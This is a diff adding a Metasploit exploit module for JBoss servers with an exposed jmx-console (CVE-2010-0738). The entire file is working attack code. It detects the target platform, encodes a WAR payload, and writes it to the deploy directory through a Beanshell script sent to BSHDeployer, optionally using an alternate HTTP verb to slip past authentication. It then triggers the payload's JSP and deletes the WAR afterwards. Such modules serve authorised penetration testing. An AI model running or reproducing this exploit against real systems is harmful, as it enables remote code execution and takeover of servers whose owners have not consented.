@@ -1,0 +1,354 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = ExcellentRanking
+
+	HttpFingerprint = { :pattern => [ /(Jetty|JBoss)/ ] }
+
+	include Msf::Exploit::Remote::HttpClient
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name'			=> 'JBoss JMX Console Beanshell Deployer WAR Upload and Deployment',
+			'Description'	=> %q{
+					This module can be used to install a WAR file payload on JBoss servers that have
+				an exposed "jmx-console" application. The payload is put on the server by
+				using the jboss.system:BSHDeployer\'s createScriptDeployment() method.
+			},
+			'Author'       =>
+				[
+					'Patrick Hof',
+					'jduck',
+					'Konrads Smelkovs',
+					'h0ng10'
+				],
+			'License'		=> BSD_LICENSE,
+			'Version' 		=> '$Revision$',
+			'References'	=>
+				[
+					[ 'CVE', '2010-0738' ], # using a VERB other than GET/POST
+					[ 'URL', 'http://www.redteam-pentesting.de/publications/jboss' ],
+					[ 'URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=574105' ],
+				],
+			'Privileged'   => true,
+			'Platform'     => ['java', 'windows', 'linux' ],
+			'Stance'       => Msf::Exploit::Stance::Aggressive,
+			'Targets'     =>
+				[
+					#
+					# do target detection but java meter by default
+					# detect via /manager/serverinfo
+					#
+					[ 'Automatic (Java based)',
+						{
+							'Arch' => ARCH_JAVA,
+							'Platform' => 'java'
+						} ],
+
+					#
+					# Platform specific targets only
+					#
+					[ 'Windows Universal',
+						{
+							'Arch' => ARCH_X86,
+							'Platform' => 'win'
+						},
+					],
+					[ 'Linux Universal',
+						{
+							'Arch' => ARCH_X86,
+							'Platform' => 'linux'
+						},
+					],
+
+					#
+					# Java version
+					#
+					[ 'Java Universal',
+						{
+							'Platform' => 'java',
+							'Arch' => ARCH_JAVA,
+						}
+					]
+				],
+			'DisclosureDate' => "Apr 26 2010",
+			'DefaultTarget'  => 0))
+
+		register_options(
+			[
+				Opt::RPORT(8080),
+				OptString.new('USERNAME',	[ false, 'The username to authenticate as' ]),
+				OptString.new('PASSWORD',	[ false, 'The password for the specified username' ]),
+				OptString.new('JSP',		   [ false, 'JSP name to use without .jsp extension (default: random)', nil ]),
+				OptString.new('APPBASE',	[ false, 'Application base name, (default: random)', nil ]),
+				OptString.new('PATH',		[ true,  'The URI path of the JMX console', '/jmx-console' ]),
+				OptString.new('VERB',		[ true,  'The HTTP verb to use (for CVE-2010-0738)', 'POST' ]),
+				OptString.new('PACKAGE',   [ true,  'The package containing the BSHDeployer service', 'auto' ])
+			], self.class)
+	end
+
+
+	def exploit
+		@previous_basic_auth_user = datastore['BasicAuthUser']
+		@previous_basic_auth_pass = datastore['BasicAuthPass']
+		datastore['BasicAuthUser']	= datastore['USERNAME']
+		datastore['BasicAuthPass']	= datastore['PASSWORD']
+
+		jsp_name = datastore['JSP'] || rand_text_alpha(8+rand(8))
+		app_base = datastore['APPBASE'] || rand_text_alpha(8+rand(8))
+
+		verb = datastore['VERB']
+		if (verb != 'GET' and verb != 'POST')
+			verb = 'HEAD'
+		end
+
+		p = payload
+		mytarget = target
+
+		if (target.name =~ /Automatic/)
+			mytarget = auto_target()
+			if (not mytarget)
+				fail_with(Exploit::Failure::NoTarget, "Unable to automatically select a target")
+			end
+			print_status("Automatically selected target \"#{mytarget.name}\"")
+		else
+			print_status("Using manually select target \"#{mytarget.name}\"")
+		end
+		arch = mytarget.arch
+
+		# set arch/platform from the target
+		plat = [Msf::Module::PlatformList.new(mytarget['Platform']).platforms[0]]
+
+		# We must regenerate the payload in case our auto-magic changed something.
+		return if ((p = exploit_regenerate_payload(plat, arch)) == nil)
+
+		# Generate the WAR containing the payload
+		war_data = p.encoded_war({
+				:app_name => app_base,
+				:jsp_name => jsp_name,
+				:arch => mytarget.arch,
+				:platform => mytarget.platform
+			}).to_s
+
+		encoded_payload = Rex::Text.encode_base64(war_data).gsub(/\n/, '')
+
+		# The following Beanshell script will write the exploded WAR file to the deploy/
+		# directory
+		bsh_script = <<-EOT
+import java.io.FileOutputStream;
+import sun.misc.BASE64Decoder;
+
+String val = "#{encoded_payload}";
+
+BASE64Decoder decoder = new BASE64Decoder();
+String jboss_home = System.getProperty("jboss.server.home.dir");
+byte[] byteval = decoder.decodeBuffer(val);
+String war_file = jboss_home + "/deploy/#{app_base + '.war'}";
+FileOutputStream fstream = new FileOutputStream(war_file);
+fstream.write(byteval);
+fstream.close();
+EOT
+
+
+		#
+		# UPLOAD
+		#
+		print_status("Creating exploded WAR in deploy/#{app_base}.war/ dir via BSHDeployer")
+		if datastore['PACKAGE'] == 'auto'
+			packages = %w{ deployer scripts }
+		else
+			packages = [ datastore['PACKAGE'] ]
+		end
+
+		pkg = nil
+		success = false
+		packages.each do |p|
+			print_status("Attempting to use '#{p}' as package")
+			res = invoke_bshscript(bsh_script, p, verb)
+			if !res
+				fail_with(Exploit::Failure::Unknown, "Unable to deploy WAR [No Response]")
+			end
+
+			if (res.code < 200 || res.code >= 300)
+				case res.code
+				when 401
+					print_error("Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
+					fail_with(Exploit::Failure::NoAccess, "Authentication requested: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}")
+				end
+				print_error("Upload to deploy WAR [#{res.code} #{res.message}]")
+				fail_with(Exploit::Failure::Unknown, "Invalid reply: #{res.code} #{res.message}")
+			else
+				success = true
+				pkg = p
+				break
+			end
+		end
+
+		if not success
+			fail_with(Exploit::Failure::Unknown, "Failed to deploy the WAR payload")
+		end
+
+
+		#
+		# EXECUTE
+		#
+		uri = '/' + app_base + '/' + jsp_name + '.jsp'
+		print_status("Executing #{uri}...")
+
+		# JBoss might need some time for the deployment. Try 5 times at most and
+		# wait 5 seconds inbetween tries
+		num_attempts = 5
+		num_attempts.times { |attempt|
+			res = send_request_cgi({
+				'uri'     => uri,
+				'method'  => 'GET'#verb
+			}, 20)
+
+			msg = nil
+			if (! res)
+				msg = "Execution failed on #{uri} [No Response]"
+			elsif (res.code < 200 or res.code >= 300)
+				msg = "Execution failed on #{uri} [#{res.code} #{res.message}]"
+			elsif (res.code == 200)
+				print_good("Successfully triggered payload at '#{uri}'")
+				break
+			end
+
+			if (attempt < num_attempts - 1)
+				msg << ", retrying in 5 seconds..."
+				print_error(msg)
+
+				select(nil, nil, nil, 5)
+			else
+				print_error(msg)
+			end
+		}
+
+
+		#
+		# DELETE
+		#
+		# The WAR can only be removed by physically deleting it, otherwise it
+		# will get redeployed after a server restart.
+		bsh_script = <<-EOT
+String jboss_home = System.getProperty("jboss.server.home.dir");
+new File(jboss_home + "/deploy/#{app_base + '.war'}").delete();
+EOT
+
+		print_status("Undeploying #{uri} by deleting the WAR file via BSHDeployer...")
+		res = invoke_bshscript(bsh_script, pkg, verb)
+		if !res
+			print_error("WARNING: Unable to remove WAR [No Response]")
+		end
+		if (res.code < 200 || res.code >= 300)
+			print_error("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
+		end
+
+		handler
+	end
+
+	def auto_target
+		print_status("Attempting to automatically select a target...")
+		res = query_serverinfo
+		if not (plat = detect_platform(res))
+			fail_with(Exploit::Failure::NoTarget, 'Unable to detect platform!')
+		end
+
+		if not (arch = detect_architecture(res))
+			fail_with(Exploit::Failure::NoTarget, 'Unable to detect architecture!')
+		end
+
+		# see if we have a match
+		targets.each { |t| return t if (t['Platform'] == plat) and (t['Arch'] == arch) }
+
+		# no matching target found, use Java as fallback
+		java_targets = targets.select {|t| t.name =~ /^Java/ }
+		return java_targets[0]
+	end
+
+	def query_serverinfo
+		path = datastore['PATH'] + '/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo'
+		res = send_request_raw(
+			{
+				'uri'    => path
+			}, 20)
+
+		if (not res) or (res.code != 200)
+			print_error("Failed: Error requesting #{path}")
+			return nil
+		end
+
+		res
+	end
+
+	# Try to autodetect the target platform
+	def detect_platform(res)
+		if (res.body =~ /<td.*?OSName.*?(Linux|FreeBSD|Windows).*?<\/td>/m)
+			os = $1
+			if (os =~ /Linux/i)
+				return 'linux'
+			elsif (os =~ /FreeBSD/i)
+				return 'linux'
+			elsif (os =~ /Windows/i)
+				return 'win'
+			end
+		end
+		nil
+	end
+
+
+	# Try to autodetect the target architecture
+	def detect_architecture(res)
+		if (res.body =~ /<td.*?OSArch.*?(x86|i386|i686|x86_64|amd64).*?<\/td>/m)
+			arch = $1
+			if (arch =~ /(x86|i386|i686)/i)
+				return ARCH_X86
+			elsif (os =~ /(x86_64|amd64)/i)
+				return ARCH_X86
+			end
+		end
+		nil
+	end
+
+
+	# Invokes +bsh_script+ on the JBoss AS via BSHDeployer
+	def invoke_bshscript(bsh_script, pkg, verb)
+		params =  'action=invokeOpByName'
+		params << '&name=jboss.' + pkg + ':service=BSHDeployer'
+		params << '&methodName=createScriptDeployment'
+		params << '&argType=java.lang.String'
+		params << '&arg0=' + Rex::Text.uri_encode(bsh_script)
+		params << '&argType=java.lang.String'
+		params << '&arg1=' + rand_text_alphanumeric(8+rand(8)) + '.bsh'
+
+		if (verb == "POST")
+			res = send_request_cgi({
+				'method'	=> verb,
+				'uri'		=> datastore['PATH'] + '/HtmlAdaptor',
+				'data'	=> params
+			})
+		else
+			res = send_request_cgi({
+				'method'	=> verb,
+				'uri'		=> datastore['PATH'] + '/HtmlAdaptor?' + params
+			})
+		end
+		res
+	end
+
+	def cleanup
+		datastore['BasicAuthUser'] = @previous_basic_auth_user
+		datastore['BasicAuthPass'] = @previous_basic_auth_pass
+	end
+end
